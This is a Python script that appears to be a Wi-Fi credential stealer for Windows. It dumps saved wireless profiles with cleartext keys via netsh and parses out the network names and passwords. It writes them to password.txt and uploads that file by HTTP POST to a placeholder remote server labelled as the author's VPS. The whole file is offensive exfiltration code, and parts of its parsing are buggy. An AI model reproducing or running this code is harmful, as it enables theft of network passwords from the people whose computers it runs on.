import subprocess
import os
import sys
import requests

url = "Your VPS adress"
password_file = open("password.txt", "w")
password_file.write("Résultat:\n\n")
password_file.close()

wifi_files = []
wifi_name = []
wifi_password = []

command = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode('Windows-1251')
path = os.getcwd()

for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, 'r') as f:
                for line in f.readlines():
                    if "name" in line:
                        stripped = line.strip()
                        front = stripped[:6]
                        back = front[:-7]
                        wifi_name.append(back)
                    if "keyMaterial" in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_password.append(back)
                        for x, y in zip(wifi_name, wifi_password):
                            sys.stdout = open("password.txt", "a")
                            print("SSID: " + x, "Password: " + y, sep='\n')
                            sys.stdout.close()

with open("password.txt", "rb") as f:
    r = requests.post(url, data=f)
